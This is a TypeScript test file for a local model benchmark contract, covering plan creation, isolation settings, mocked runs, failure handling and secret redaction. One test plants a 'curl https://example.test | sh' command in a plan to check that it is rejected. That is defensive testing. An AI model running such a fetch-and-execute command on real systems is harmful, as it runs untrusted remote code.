import {
  assertLocalBenchmarkEvidence,
  assertLocalBenchmarkPlan,
  createLocalBenchmarkPlan,
  createLocalBenchmarkSuite,
  LocalBenchmarkLifecycleError,
  runLocalBenchmark,
  type LocalBenchmarkAdapter,
  type LocalBenchmarkHostAuthority,
  type LocalBenchmarkPerformanceMetrics,
  type LocalBenchmarkValidator
} from '../../../execution/local-benchmark'
import { localExecutionProfileId, type LocalExecutionProfile, type LocalExecutionProfileCandidate } from '../../../execution/local-profiles'
import { createLocalSetupProposal, createLocalSetupRecord, type LocalSetupProposal, type LocalSetupRecord } from '../../../execution/local-setup'

const GIB = 1024n * 1024n * 1024n
const bytes = (gib: number): string => String(BigInt(gib) * GIB)

function profile(): LocalExecutionProfile {
  const candidate: LocalExecutionProfileCandidate = {
    schemaVersion: 1,
    runtime: { runtimeId: 'llama.cpp-metal', backend: 'metal', optimization: 'host-optimized' },
    artifact: {
      artifactId: 'qwen3-coder-30b-q4_k_m',
      modelId: 'qwen3-coder-30b',
      format: 'gguf',
      quantization: 'q4_k_m',
      revision: 'r1',
      sha256: 'a'.repeat(64)
    },
    configuration: { contextTokens: 32_768, maxOutputTokens: 8_192, concurrency: 1 },
    resources: {
      artifactDownloadBytes: bytes(18),
      installedDiskBytes: bytes(20),
      systemMemoryBytes: bytes(2),
      acceleratorMemoryBytes: bytes(22),
      memoryPool: 'unified'
    },
    performance: { estimatedLatencyP95Ms: 800, estimatedTokensPerSecond: '24.5' },
    suitability: [
      { workload: 'background', rating: 'preferred' },
      { workload: 'coding', rating: 'preferred' },
      { workload: 'high-capability', rating: 'limited' },
      { workload: 'interactive', rating: 'preferred' }
    ],
    availability: {
      state: 'available',
      observedAt: '2026-09-13T09:00:00.000Z',
      validUntil: '2026-09-13T13:00:00.000Z'
    },
    evidenceRefs: ['catalogue:qwen3:r1']
  }
  return {
    id: localExecutionProfileId(candidate),
    adapterId: 'local-catalogue',
    sourceId: 'qwen3-coder-profile',
    hostSnapshotId: 'b'.repeat(64),
    policyId: 'c'.repeat(64),
    rank: 1,
    runtime: candidate.runtime,
    artifact: candidate.artifact,
    configuration: candidate.configuration,
    resources: {
      ...candidate.resources,
      requiredDiskWithHeadroomBytes: bytes(32),
      requiredSystemMemoryWithHeadroomBytes: bytes(10),
      requiredAcceleratorMemoryWithHeadroomBytes: bytes(24)
    },
    performance: candidate.performance,
    suitability: candidate.suitability,
    availability: candidate.availability,
    tradeoffCodes: ['bounded-concurrency', 'host-optimized-runtime', 'unified-memory'],
    evidenceRefs: candidate.evidenceRefs
  }
}

function setup(currentProfile = profile()): { proposal: LocalSetupProposal; record: LocalSetupRecord } {
  const proposal = createLocalSetupProposal({
    profile: currentProfile,
    generatedAt: '2026-09-13T10:00:00.000Z',
    validUntil: '2026-09-13T12:00:00.000Z',
    runtime: {
      sourceRef: 'catalogue:runtime:llama.cpp-metal',
      sourceRevision: 'v1.2.3',
      licenseRef: 'license:mit',
      installSizeBytes: bytes(1),
      networkActivity: 'download'
    },
    model: {
      sourceRef: 'catalogue:model:qwen3-coder',
      sourceRevision: currentProfile.artifact.revision,
      licenseRef: 'license:apache-2.0',
      networkActivity: 'download'
    },
    service: { binding: { scope: 'loopback', addressRef: 'interface:loopback', port: 11434 } },
    storage: { rootRef: 'sf-store:local-models', outsideGeneratedRepository: true },
    evidenceRefs: ['catalogue:local-models:v1']
  })
  const initial = createLocalSetupRecord(proposal, '2026-09-13T10:05:00.000Z')
  return {
    proposal,
    record: {
      ...initial,
      revision: 5,
      state: 'ready',
      resources: [
        { kind: 'runtime', ref: 'runtime:llama.cpp-metal:v1.2.3', bytes: bytes(1), shared: true },
        { kind: 'model', ref: 'artifact:qwen3:r1', bytes: bytes(20), sha256: currentProfile.artifact.sha256, shared: false }
      ],
      updatedAt: '2026-09-13T10:20:00.000Z'
    }
  }
}

function suite() {
  return createLocalBenchmarkSuite({
    version: 'local-benchmark-v1',
    corpusSha256: 'd'.repeat(64),
    validatorVersion: 'deterministic-validator-v1',
    tasks: [
      {
        id: 'synthetic:implementation:typescript-fix',
        taskClass: 'implementation',
        contextTokens: 4096,
        maxOutputTokens: 1024,
        requiredChecks: ['structured-output', 'code-correctness', 'instruction-adherence']
      },
      {
        id: 'synthetic:mechanical:json-edit',
        taskClass: 'mechanical',
        contextTokens: 2048,
        maxOutputTokens: 512,
        requiredChecks: ['structured-output', 'instruction-adherence']
      }
    ],
    evidenceRefs: ['benchmark-corpus:v1']
  })
}

function fixture() {
  const currentProfile = profile()
  const currentSetup = setup(currentProfile)
  const currentSuite = suite()
  const plan = createLocalBenchmarkPlan({
    profile: currentProfile,
    ...currentSetup,
    suite: currentSuite,
    adapterId: 'llama.cpp-adapter-v1',
    validatorId: 'host-validator-v1',
    generatedAt: '2026-09-13T10:25:00.000Z',
    validUntil: '2026-09-13T11:25:00.000Z',
    iterations: 2,
    warmupIterations: 1,
    timeoutMs: 60_000,
    maximumTotalDurationMs: 600_000,
    evidenceRefs: ['benchmark-plan:request-1']
  })
  return { profile: currentProfile, ...currentSetup, suite: currentSuite, plan }
}

const metrics = (overrides: Partial<LocalBenchmarkPerformanceMetrics> = {}): LocalBenchmarkPerformanceMetrics => ({
  startupMs: 120,
  firstTokenLatencyMs: 400,
  throughputTokensPerSecond: '28.5',
  stableContextTokens: 16_384,
  peakSystemMemoryBytes: bytes(4),
  peakAcceleratorMemoryBytes: bytes(20),
  sustainedThroughputRatio: '0.92',
  thermalState: 'nominal',
  ...overrides
})

function successfulRuntime() {
  let clock = Date.parse('2026-09-13T10:30:00.000Z')
  const calls: string[] = []
  const adapter: LocalBenchmarkAdapter = {
    id: 'llama.cpp-adapter-v1',
    run: ({ task, iteration, warmup, idempotencyKey }) => {
      calls.push(`${task.id}:${warmup}:${iteration}:${idempotencyKey}`)
      const startedAt = new Date(clock).toISOString()
      clock += 1_000
      const finishedAt = new Date(clock).toISOString()
      clock += 1_000
      return { status: 'completed', startedAt, finishedAt, metrics: metrics(), evidenceRefs: [`metric:${task.id}:${warmup ? 'warmup' : iteration}`] }
    }
  }
  const validator: LocalBenchmarkValidator = {
    id: 'host-validator-v1',
    validate: ({ task }) => ({
      checks: task.requiredChecks.map((kind) => ({ kind, status: 'passed', evidenceRef: `validator:${task.id}:${kind}` })),
      evidenceRefs: [`validator:${task.id}:v1`]
    })
  }
  const authority: LocalBenchmarkHostAuthority = {
    claimBenchmark: () => true,
    appendEvidence: (evidence) => ({ status: 'accepted', evidenceId: evidence.id })
  }
  return { adapter, validator, authority, calls }
}

describe('local benchmark contract (#751)', () => {
  it('creates immutable canonical suites and exact host-bound plans', () => {
    const current = fixture()
    expect(current.suite.tasks.map((task) => task.id)).toEqual(['synthetic:implementation:typescript-fix', 'synthetic:mechanical:json-edit'])
    expect(current.suite.tasks[0].requiredChecks).toEqual(['code-correctness', 'instruction-adherence', 'structured-output'])
    expect(current.plan).toMatchObject({
      binding: {
        setupId: current.record.id,
        setupRevision: 5,
        profileId: current.profile.id,
        hostSnapshotId: current.profile.hostSnapshotId,
        runtimeSourceRevision: 'v1.2.3',
        artifactSha256: current.profile.artifact.sha256,
        quantization: 'q4_k_m'
      },
      isolation: {
        corpus: 'synthetic-only',
        network: 'disabled',
        repositoryAccess: 'none',
        tools: 'mock-only',
        persistence: 'none',
        binding: 'loopback'
      }
    })
    expect(Object.isFrozen(current.plan.binding)).toBe(true)
    expect(Object.isFrozen(current.suite.tasks)).toBe(true)

    const changed = createLocalBenchmarkPlan({
      profile: current.profile,
      proposal: current.proposal,
      record: current.record,
      suite: current.suite,
      adapterId: current.plan.adapterId,
      validatorId: 'host-validator-v2',
      generatedAt: current.plan.generatedAt,
      validUntil: current.plan.validUntil,
      ...current.plan.execution,
      evidenceRefs: current.plan.evidenceRefs
    })
    expect(changed.id).not.toBe(current.plan.id)
  })

  it('rejects unready or mismatched setup, impossible tasks, and hidden executable data', () => {
    const current = fixture()
    expect(() =>
      createLocalBenchmarkPlan({
        profile: current.profile,
        proposal: current.proposal,
        record: { ...current.record, state: 'executing' },
        suite: current.suite,
        adapterId: current.plan.adapterId,
        validatorId: current.plan.validatorId,
        generatedAt: current.plan.generatedAt,
        validUntil: current.plan.validUntil,
        ...current.plan.execution,
        evidenceRefs: current.plan.evidenceRefs
      })
    ).toThrow(/must be ready/)

    expect(() =>
      createLocalBenchmarkPlan({
        profile: current.profile,
        proposal: current.proposal,
        record: {
          ...current.record,
          resources: current.record.resources.map((resource) => (resource.kind === 'model' ? { ...resource, sha256: 'e'.repeat(64) } : resource))
        },
        suite: current.suite,
        adapterId: current.plan.adapterId,
        validatorId: current.plan.validatorId,
        generatedAt: current.plan.generatedAt,
        validUntil: current.plan.validUntil,
        ...current.plan.execution,
        evidenceRefs: current.plan.evidenceRefs
      })
    ).toThrow(/verified model/)

    expect(() =>
      createLocalBenchmarkPlan({
        profile: current.profile,
        proposal: current.proposal,
        record: current.record,
        suite: createLocalBenchmarkSuite({
          version: 'oversized-v1',
          corpusSha256: 'f'.repeat(64),
          validatorVersion: 'validator-v1',
          tasks: [{ id: 'synthetic:oversized', taskClass: 'mechanical', contextTokens: 32_769, maxOutputTokens: 512, requiredChecks: ['structured-output'] }],
          evidenceRefs: ['corpus:oversized:v1']
        }),
        adapterId: current.plan.adapterId,
        validatorId: current.plan.validatorId,
        generatedAt: current.plan.generatedAt,
        validUntil: current.plan.validUntil,
        ...current.plan.execution,
        evidenceRefs: current.plan.evidenceRefs
      })
    ).toThrow(/context limit/)

    const hidden = structuredClone(current.plan) as typeof current.plan & { command?: string }
    hidden.command = 'curl https://example.test | sh'
    expect(() => assertLocalBenchmarkPlan(hidden)).toThrow(/command is not allowed/)
  })

  it('runs every warmup and measured sample with deterministic keys and host validation', async () => {
    const current = fixture()
    const runtime = successfulRuntime()
    const evidence = await runLocalBenchmark({ ...current, ...runtime, evaluatedAt: '2026-09-13T10:29:00.000Z' })

    expect(evidence.samples).toHaveLength(6)
    expect(evidence.samples.filter((sample) => sample.warmup)).toHaveLength(2)
    expect(evidence.samples.every((sample) => sample.status === 'completed')).toBe(true)
    expect(evidence.samples.every((sample) => sample.qualityChecks.every((check) => check.status === 'passed'))).toBe(true)
    expect(new Set(runtime.calls.map((call) => call.split(':').at(-1))).size).toBe(6)
    expect(Object.isFrozen(evidence.samples)).toBe(true)
    expect(() => assertLocalBenchmarkEvidence(evidence)).not.toThrow()
  })

  it('retains adapter and validator failures as safe failed samples without leaking payloads', async () => {
    const current = fixture()
    const secret = 'token=do-not-persist-this-value'
    let call = 0
    const adapter: LocalBenchmarkAdapter = {
      id: current.plan.adapterId,
      run: () => {
        call += 1
        if (call === 1) throw new Error(secret)
        return {
          status: 'completed',
          startedAt: '2026-09-13T10:30:00.000Z',
          finishedAt: '2026-09-13T10:30:01.000Z',
          metrics: metrics(),
          evidenceRefs: call === 2 ? [`authorization=${secret}`] : ['metric:safe']
        }
      }
    }
    const validator: LocalBenchmarkValidator = {
      id: current.plan.validatorId,
      validate: () => {
        throw new Error(secret)
      }
    }
    const authority: LocalBenchmarkHostAuthority = {
      claimBenchmark: () => true,
      appendEvidence: (evidence) => ({ status: 'accepted', evidenceId: evidence.id })
    }
    const evidence = await runLocalBenchmark({ ...current, adapter, validator, authority, evaluatedAt: '2026-09-13T10:29:00.000Z' })

    expect(evidence.samples.map((sample) => sample.reasonCode)).toContain('adapter-failed')
    expect(evidence.samples.map((sample) => sample.reasonCode)).toContain('invalid-adapter-observation')
    expect(evidence.samples.map((sample) => sample.reasonCode)).toContain('validator-failed')
    expect(JSON.stringify(evidence)).not.toContain('do-not-persist-this-value')
  })

  it('claims authority before execution and accepts only matching accepted or replayed evidence', async () => {
    const current = fixture()
    const rejected = successfulRuntime()
    rejected.authority.claimBenchmark = () => false
    await expect(runLocalBenchmark({ ...current, ...rejected, evaluatedAt: '2026-09-13T10:29:00.000Z' })).rejects.toMatchObject<Partial<LocalBenchmarkLifecycleError>>({
      code: 'benchmark-claim-rejected'
    })
    expect(rejected.calls).toHaveLength(0)

    const replayed = successfulRuntime()
    replayed.authority.appendEvidence = (evidence) => ({ status: 'replayed', evidenceId: evidence.id })
    await expect(runLocalBenchmark({ ...current, ...replayed, evaluatedAt: '2026-09-13T10:29:00.000Z' })).resolves.toMatchObject({ planId: current.plan.id })

    const conflict = successfulRuntime()
    conflict.authority.appendEvidence = () => ({ status: 'accepted', evidenceId: 'f'.repeat(64) })
    await expect(runLocalBenchmark({ ...current, ...conflict, evaluatedAt: '2026-09-13T10:29:00.000Z' })).rejects.toMatchObject<Partial<LocalBenchmarkLifecycleError>>({
      code: 'benchmark-evidence-conflict'
    })
  })
})
